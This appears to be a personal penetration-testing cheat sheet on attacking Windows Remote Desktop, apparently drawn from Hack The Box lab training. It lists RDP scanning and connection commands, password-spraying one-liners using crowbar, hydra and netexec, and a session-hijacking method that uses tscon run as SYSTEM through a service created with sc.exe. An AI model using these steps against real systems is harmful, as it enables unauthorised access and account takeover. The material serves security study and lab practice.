##### Scanning
```bash
nmap -sV -sC $ip -p3389 --script rdp*
```
##### Connecting
```bash
xfreerdp3 /v:$ip /u:htb-rdp /p:'HTBRocks!' /dynamic-resolution /drive:OP,/home/adot/opt

xfreerdp /u:Adot /v:WinDot /dynamic-resolution /drive:OP,/home/adot/opt /multimon

xfreerdp /u:user /p:"P455w0rd!" /v:$ip
rdesktop $ip
```
##### Password Spraying
```bash
crowbar -b rdp -s $ip/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' $ip rdp
netexec rdp $ip -u users.txt -p 'password123'
```
##### EDR Evaison
```bash
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl $ip
```

#### [Pass-The-Hash](obsidian://open?vault=Penetration%20Testing&file=Root%2FActive%20Directory%2FPass-the-Hash)
Explained Here 

The [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration

### Session Hijacking
As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

```powershell
query user
```
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session).

```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

We can create a service that will run tscon as **SYSTEM**
```powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```
![[Pasted image 20250120065528.png]]